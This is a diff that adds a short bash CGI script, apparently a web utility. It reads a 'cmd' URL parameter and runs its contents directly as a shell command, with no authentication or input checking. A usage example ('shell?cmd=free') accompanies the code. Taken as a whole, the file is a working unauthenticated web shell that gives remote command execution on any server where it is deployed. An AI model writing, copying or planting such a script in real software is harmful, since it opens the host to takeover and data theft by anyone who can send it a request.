@@ -1,0 +1,16 @@
+#!/bin/bash
+
+. ./bashlib
+
+head 
+
+SHELL_CMD=`param cmd`
+
+if [ "$SHELL_CMD" == "" ];then
+    echo FAILED
+    echo example:
+    echo http://127.0.0.1/shell?cmd=free    #show the memory information
+fi
+
+
+$SHELL_CMD
